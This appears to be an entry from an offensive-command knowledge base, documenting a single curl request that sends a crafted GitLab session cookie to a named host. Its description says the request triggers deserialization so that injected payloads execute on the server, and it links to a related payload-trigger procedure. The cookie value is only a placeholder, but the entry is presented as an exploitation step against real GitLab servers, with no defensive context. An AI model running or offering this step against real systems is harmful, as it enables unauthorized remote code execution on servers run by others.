---
data: 'curl -v ''http://gitlab.wbowling.info/root'' -H ''Cookie: _gitlab_session=gggg'''
tags:
  - http-request
  - curl
type: command
executor: bash
platforms:
  - Linux
id: f98826e1-c64a-4ca9-aead-7a88176856d7
created_at: '2025-12-11T03:48:06.026Z'
updated_at: '2025-12-11T03:48:06.026Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-session-payload

## Command

```bash
curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'
```

## Description

Sends a verbose GET request to GitLab with a crafted session cookie to trigger deserialization and execute injected payloads.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose output | No |
| `-H` | Header with cookie | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -v 'http://gitlab.example.com/root' -H 'Cookie: _gitlab_session=gggg'
```

## Expected Output

HTTP response headers and body; payload executes on server side.

## Related

- [[procedures/Trigger-Deserialization-Payload-via-Session-Cookie]]
- #curl
